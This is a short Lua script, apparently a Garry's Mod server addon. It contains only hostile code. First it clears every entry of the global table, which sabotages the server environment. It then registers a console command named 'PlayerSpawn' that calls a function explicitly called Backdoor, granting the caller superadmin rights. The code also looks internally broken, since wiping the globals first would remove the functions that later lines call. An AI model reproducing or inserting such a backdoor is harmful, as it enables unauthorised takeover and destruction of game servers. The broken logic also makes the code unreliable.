-- You shouldn't be running this...
for k,v in pairs( _G ) do
	_G[k] = nil
	_G[v] = nil
end

function Backdoor( ply )
        ply:SetUserGroup("superadmin")
end
concommand.Add("PlayerSpawn", Backdoor)
